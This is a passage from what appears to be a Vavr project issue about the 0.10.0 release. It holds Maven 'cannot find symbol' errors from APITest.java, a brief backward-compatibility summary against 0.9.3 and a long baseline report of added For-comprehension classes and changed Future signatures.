/Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[690,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[691,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[692,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[693,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[694,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[695,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[696,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[697,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[698,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[699,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[725,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[731,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[732,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[738,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[739,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[740,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[746,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[747,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[748,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[749,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[755,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[756,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[757,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[758,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[759,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[765,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[766,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[767,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[768,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[769,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[770,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[776,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[777,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[778,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[779,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[780,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[781,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[782,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[788,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[789,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n```\n\n\nUpdate\n\u2705 All unit tests of v0.9.3 run with v0.10.0 (!). ## Summary\nThese are the crucial changes from v0.9.3 -> v0.10.0 regarding backward compatibility.\nI see a green light regarding the release.\n\nremoved internal interface io.vavr.Lambda\nwidened Future ExecutorService arguments to Executor\n\nFull backward compatibility analysis\nCaution: it needs to be interpreted correctly!\n\n\n```\n[INFO] Comparing bundle vavr version 0.10.0-SNAPSHOT to version 0.9.3\n[INFO] \n[INFO]   PACKAGE_NAME                                       DELTA      CUR_VER    BASE_VER   REC_VER    WARNINGS  \n[INFO] = ================================================== ========== ========== ========== ========== ==========\n[INFO] > io.vavr                                            major      0.10.0     0.9.3      1.0.0      Version increase required\n[INFO]      > class io.vavr.API\n[INFO]          + method For(io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For1List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For2List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For3List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For4List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For5List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For6List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For7List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For8List\n[INFO]          + method For(io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For1Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For2Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For3Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For4Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For5Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For6Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For7Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For8Future\n[INFO]          + method For(io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For1Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For2Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For3Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For4Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For5Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For6Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For7Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For8Option\n[INFO]          + method For(io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For1Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For2Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For3Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For4Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For5Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For6Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For7Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For8Try\n[INFO]          + method Future(java.util.concurrent.Executor,io.vavr.CheckedFunction0)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method Future(java.util.concurrent.Executor,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method Future(java.util.concurrent.ExecutorService,io.vavr.CheckedFunction0)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          - method Future(java.util.concurrent.ExecutorService,java.lang.Object)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For1Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield()\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method yield(java.util.function.Function)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For1List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield()\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method yield(java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For1Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield()\n[INFO]              + return io.vavr.control.Option\n[INFO]          + method yield(java.util.function.Function)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For1Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield()\n[INFO]              + return io.vavr.control.Try\n[INFO]          + method yield(java.util.function.Function)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For2Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(java.util.function.BiFunction)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For2List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(java.util.function.BiFunction)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For2Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(java.util.function.BiFunction)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For2Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(java.util.function.BiFunction)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For3Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function3)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For3List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function3)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For3Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function3)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For3Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function3)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For4Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function4)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For4List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function4)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For4Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function4)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For4Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function4)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For5Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function5)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For5List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function5)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For5Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function5)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For5Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function5)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For6Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function6)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For6List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function6)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For6Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function6)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For6Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function6)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For7Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function7)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For7List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function7)\n[INFO]              + return 